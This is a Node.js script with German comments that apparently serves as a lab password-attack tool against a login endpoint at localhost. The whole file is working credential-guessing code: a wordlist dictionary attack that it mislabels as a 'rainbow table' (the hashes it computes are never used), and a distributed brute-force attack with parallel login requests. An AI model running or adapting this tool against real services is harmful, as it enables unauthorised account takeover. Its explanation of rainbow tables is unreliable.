const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const fetch = global.fetch || require('node-fetch');

// Konfigurationskonstanten
const TARGET_URL = 'http://localhost:3000/login';  // Ziel-Login-Endpoint
const RAINBOW_TABLE_PATH = path.resolve(__dirname, 'rainbow_table.json');  // Pfad zur Rainbow Table
// Globaler Flag, ob Passwort gefunden wurde
let found = false;

/**
 * Implementiert eine einfache Concurrency-Limitierung für asynchrone Operationen.
 * Verhindert, dass zu viele parallele Requests gleichzeitig ausgeführt werden.
 *
 * @param {number} concurrency - Maximale Anzahl gleichzeitiger Operationen
 * @returns {Function} - Funktion zum Einreihen von Promises
 */
const pLimit = (concurrency) => {
    const queue = [];  // Warteschlange für ausstehende Tasks
    let active = 0;    // Anzahl aktuell laufender Tasks

    /**
     * Verarbeitet die nächste Task in der Warteschlange, falls möglich
     */
    const next = () => {
        if (queue.length === 0) return;  // Keine Tasks vorhanden
        if (active >= concurrency) return;  // Limit bereits erreicht

        active++;
        const {fn, resolve} = queue.shift();  // Nimm nächste Task

        // Führe Task aus und handle Completion
        fn().then((r) => {
            active--;
            resolve(r);
            next();  // Verarbeite nächste Task
        }, (e) => {
            active--;
            resolve(Promise.reject(e));
            next();  // Verarbeite nächste Task auch bei Fehler
        });
    };

    // Returniere Funktion zum Einreihen neuer Tasks
    return (fn) => new Promise((resolve) => {
        queue.push({fn, resolve});
        next();
    });
};

/**
 * Generiert einen kryptographischen Hash für ein gegebenes Passwort.
 *
 * @param {string} password - Das zu hashende Passwort
 * @param {string} algorithm - Hash-Algorithmus (Standard: 'sha256')
 * @returns {string} - Hexadezimale Darstellung des Hashes
 */
function generateHash(password, algorithm = 'sha256') {
    return crypto.createHash(algorithm).update(password).digest('hex');
}

/**
 * Erstellt eine Rainbow Table aus einer Wortliste.
 * Eine Rainbow Table mappt Passwort-Hashes zu den ursprünglichen Passwörtern.
 *
 * Vorteile:
 * - Schnelle Passwort-Lookup durch Hash
 * - Einmalige Berechnung, mehrfache Verwendung
 * - Effizient für wiederholte Angriffe
 *
 * @param {string[]} wordlist - Array von Passwörtern
 * @param {string} outputPath - Dateipfad zum Speichern der Rainbow Table
 * @param {string} algorithm - Hash-Algorithmus (Standard: 'sha256')
 * @returns {Object} - Rainbow Table als Objekt {hash: password}
 */
function buildRainbowTable(wordlist, outputPath, algorithm = 'sha256') {
    console.log(`Erstelle Rainbow Table mit ${algorithm}...`);

    const table = {};  // Hash -> Passwort Mapping
    let count = 0;

    // Iteriere über alle Passwörter und berechne Hashes
    for (const password of wordlist) {
        const hash = generateHash(password, algorithm);
        table[hash] = password;  // Speichere Hash -> Passwort Zuordnung
        count++;

        // Fortschrittsanzeige alle 1000 Einträge
        if (count % 1000 === 0) {
            process.stdout.write(`\rGeneriert: ${count} Einträge`);
        }
    }

    console.log(`\n✓ Rainbow Table erstellt: ${count} Einträge`);

    // Speichere Rainbow Table als JSON-Datei
    fs.writeFileSync(outputPath, JSON.stringify(table, null, 2));
    console.log(`✓ Gespeichert: ${outputPath}`);

    return table;
}

/**
 * Lädt eine bestehende Rainbow Table aus einer Datei.
 *
 * @param {string} filePath - Pfad zur Rainbow Table Datei
 * @returns {Object|null} - Rainbow Table Objekt oder null, falls nicht gefunden
 */
function loadRainbowTable(filePath) {
    if (fs.existsSync(filePath)) {
        console.log(`Lade Rainbow Table von ${filePath}...`);

        // Lese und parse JSON-Datei
        const data = fs.readFileSync(filePath, 'utf8');
        const table = JSON.parse(data);

        console.log(`✓ Rainbow Table geladen: ${Object.keys(table).length} Einträge`);
        return table;
    }
    return null;
}

/**
 * Führt einen Rainbow Table Angriff durch.
 * Testet alle in der Rainbow Table gespeicherten Passwörter gegen den Login-Endpoint.
 *
 * @param {string} username - Ziel-Benutzername
 * @param {Object} rainbowTable - Rainbow Table {hash: password}
 */
async function tryWithRainbowTable(username, rainbowTable) {
    console.log('\n=== RAINBOW TABLE ANGRIFF ===');

    // Extrahiere alle Passwörter aus der Rainbow Table
    const passwords = Object.values(rainbowTable);
    console.log(`Teste ${passwords.length} Passwörter aus Rainbow Table...`);

    // Initialisiere Concurrency Limiter für parallele Requests
    const limit = pLimit(10);
    let tested = 0;

    // Teste jedes Passwort aus der Rainbow Table
    for (const password of passwords) {
        if (found) break;  // Abbruch bei Erfolg

        await limit(() => tryCandidate(password, username));
        tested++;

        // Fortschrittsanzeige alle 100 Versuche
        if (tested % 100 === 0) {
            process.stdout.write(`\rGetestet: ${tested}/${passwords.length}`);
        }
    }

    console.log(`\nRainbow Table Angriff abgeschlossen: ${tested} Passwörter getestet`);
}

/**
 * Extrahiert Instanz-Konfiguration für verteilte Brute-Force Angriffe.
 * Ermöglicht Parallelisierung über mehrere Prozesse/Maschinen.
 *
 * @returns {Object} - {instanceId, totalInstances}
 */
function getInstanceConfig() {
    // Lese aus Umgebungsvariablen oder Kommandozeilenargumenten
    const instanceId = parseInt(process.env.INSTANCE_ID || process.argv[4] || '0');
    const totalInstances = parseInt(process.env.TOTAL_INSTANCES || process.argv[5] || '1');

    return {instanceId, totalInstances};
}

/**
 * Generator-Funktion für verteilte Brute-Force-Passwort-Generierung.
 * Unterstützt Work-Splitting über mehrere Instanzen.
 *
 * Algorithmus:
 * - Jede Instanz bearbeitet jeden n-ten Kandidaten (wobei n = totalInstances)
 * - Instance 0 testet: 0, n, 2n, 3n, ...
 * - Instance 1 testet: 1, n+1, 2n+1, 3n+1, ...
 *
 * @param {string[]} charset - Array mit verfügbaren Zeichen
 * @param {number} maxLen - Maximale Passwortlänge
 * @param {number} startIdx - Start-Index für diese Instanz
 * @param {number} skipCount - Anzahl Instanzen (Skip-Intervall)
 * @yields {string} - Nächster Passwort-Kandidat für diese Instanz
 */
function* generateBruteForce(charset, maxLen, startIdx = 0, skipCount = 1) {
    let currentIdx = 0;  // Globaler Zähler über alle Kombinationen

    // Iteriere über alle Passwortlängen
    for (let len = 1; len <= maxLen; len++) {
        const indices = Array(len).fill(0);  // Index-Array für Zeichenpositionen

        while (true) {
            // Prüfe, ob dieser Kandidat zu dieser Instanz gehört
            if (currentIdx >= startIdx && (currentIdx - startIdx) % skipCount === 0) {
                yield indices.map(i => charset[i]).join('');
            }

            currentIdx++;

            // Inkrementiere Indices (funktioniert wie ein Zählwerk)
            let pos = len - 1;
            while (pos >= 0) {
                indices[pos]++;
                if (indices[pos] < charset.length) break;  // Kein Überlauf
                indices[pos] = 0;  // Überlauf: Reset und carry
                pos--;
            }

            // Wenn alle Positionen übergelaufen sind, fertig mit dieser Länge
            if (pos < 0) break;
        }
    }
}

/**
 * Führt einen verteilten Brute-Force Angriff durch.
 * Kann über mehrere Instanzen parallelisiert werden.
 *
 * @param {string} username - Ziel-Benutzername
 * @param {string[]} charset - Array mit verfügbaren Zeichen
 * @param {number} maxLen - Maximale Passwortlänge
 * @param {number} instanceId - ID dieser Instanz (0-basiert)
 * @param {number} totalInstances - Gesamtanzahl paralleler Instanzen
 */
async function bruteForceAttack(username, charset, maxLen, instanceId, totalInstances) {
    console.log('\n=== BRUTE FORCE ANGRIFF ===');
    console.log(`Charset: ${charset.join('')}`);
    console.log(`Max Länge: ${maxLen}`);
    console.log(`Instance: ${instanceId + 1}/${totalInstances}`);

    // Erstelle Generator für diese Instanz
    const generator = generateBruteForce(charset, maxLen, instanceId, totalInstances);

    // Initialisiere Concurrency Limiter
    const limit = pLimit(10);
    let tested = 0;

    // Teste alle von dieser Instanz zugewiesenen Kandidaten
    for (const candidate of generator) {
        if (found) break;  // Abbruch bei Erfolg

        await limit(() => tryCandidate(candidate, username));
        tested++;

        // Fortschrittsanzeige alle 1000 Versuche
        if (tested % 1000 === 0) {
            process.stdout.write(`\rBrute-Force Versuche: ${tested}`);
        }

        // Zeige aktuellen Kandidaten
        process.stdout.write(`\rTrying candidate: ${candidate}`);
    }

    console.log(`\nBrute Force abgeschlossen: ${tested} Kombinationen getestet`);
}

/**
 * Testet einen einzelnen Passwort-Kandidaten gegen den Login-Endpoint.
 *
 * @param {string} candidate - Zu testendes Passwort
 * @param {string} username - Benutzername
 * @returns {Promise<boolean>} - true wenn erfolgreich, sonst false
 */
async function tryCandidate(candidate, username) {
    if (found) return false;  // Abbruch, falls bereits gefunden

    const body = {username: username, password: candidate};

    try {
        // Sende Login-Request
        const resp = await fetch(TARGET_URL, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(body)
        });

        if (resp.status === 200) {
            // Erfolgreicher Login - Passwort gefunden!
            console.log(`\n✓✓✓ PASSWORT GEFUNDEN für ${username}: ${candidate}`);
            found = true;
            return true;
        }

        return false;
    } catch (err) {
        console.error(`\nNetzwerkfehler: ${err.message}`);
        return false;
    }
}

// ============================================================================
// HAUPTPROGRAMM - Kommandozeilen-Interface
// ============================================================================

// Extrahiere Kommandozeilenargumente
const USERNAME = process.argv[2];
const MODE = process.argv[3] || 'rainbow';

// Zeige Hilfe, falls keine Argumente übergeben wurden
if (!USERNAME) {
    console.error('Usage: node attacker.js <username> <mode> [instanceId] [totalInstances]');
    console.error('');
    console.error('Modes:');
    console.error('  rainbow    - Rainbow Table Angriff');
    console.error('  bruteforce - Brute Force Angriff (parallelisierbar)');
    console.error('  create     - Erstelle Rainbow Table aus wordlist.txt');
    console.error('');
    console.error('Beispiele:');
    console.error('  node attacker.js admin rainbow');
    console.error('  node attacker.js admin bruteforce 0 4    # Instanz 1 von 4');
    console.error('  node attacker.js admin create');
    process.exit(1);
}

/**
 * Hauptausführungsfunktion - Koordiniert die verschiedenen Angriffsmodi
 */
(async () => {
    console.log(`\n=== PASSWORD ATTACK TOOL ===`);
    console.log(`Target: ${TARGET_URL}`);
    console.log(`Username: ${USERNAME}`);
    console.log(`Mode: ${MODE}`);

    // Lade Instanz-Konfiguration für verteilte Angriffe
    const {instanceId, totalInstances} = getInstanceConfig();

    // MODE: CREATE - Erstelle neue Rainbow Table
    if (MODE === 'create') {
        console.log('\n=== RAINBOW TABLE ERSTELLEN ===');

        const wordlistPath = path.resolve(__dirname, 'wordlist.txt');

        // Prüfe, ob Wortliste existiert
        if (!fs.existsSync(wordlistPath)) {
            console.error(`Fehler: ${wordlistPath} nicht gefunden!`);
            console.error('Erstelle eine wordlist.txt Datei mit Passwörtern (ein Passwort pro Zeile)');
            process.exit(1);
        }

        // Lade Wortliste aus Datei
        const wordlist = fs.readFileSync(wordlistPath, 'utf8')
            .split(/\r?\n/)         // Zeilen aufteilen
            .map(line => line.trim())  // Whitespace entfernen
            .filter(Boolean);       // Leere Zeilen entfernen

        console.log(`Wordlist geladen: ${wordlist.length} Einträge`);

        // Erstelle und speichere Rainbow Table
        buildRainbowTable(wordlist, RAINBOW_TABLE_PATH);
        process.exit(0);
    }

    // MODE: RAINBOW - Rainbow Table Angriff
    if (MODE === 'rainbow') {
        let rainbowTable = loadRainbowTable(RAINBOW_TABLE_PATH);

        // Prüfe, ob Rainbow Table existiert
        if (!rainbowTable) {
            console.error('\nKeine Rainbow Table gefunden!');
            console.error('Erstelle zuerst eine Rainbow Table mit: node attacker.js <user> create');
            process.exit(1);
        }

        // Führe Rainbow Table Angriff durch
        await tryWithRainbowTable(USERNAME, rainbowTable);
    }
    // MODE: BRUTEFORCE - Verteilter Brute-Force Angriff
    else if (MODE === 'bruteforce') {
        console.log(`Instance: ${instanceId + 1}/${totalInstances}`);

        // Definiere Zeichensatz für Brute-Force
        const charset = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+-=[]{}|;:,.<>?'.split('');
        const maxLen = 20;  // Maximale Passwortlänge

        // Führe Brute-Force Angriff durch
        await bruteForceAttack(USERNAME, charset, maxLen, instanceId, totalInstances);
    }
    // Unbekannter Modus
    else {
        console.error(`Unbekannter Mode: ${MODE}`);
        console.error('Verwende: rainbow, bruteforce, oder create');
        process.exit(1);
    }

    // Abschlussmeldung
    console.log('\n=== FERTIG ===');
    if (!found) {
        console.log('Passwort nicht gefunden.');
    }

    // Exit Code: 0 = Erfolg, 1 = Kein Passwort gefunden
    process.exit(found ? 0 : 1);
})();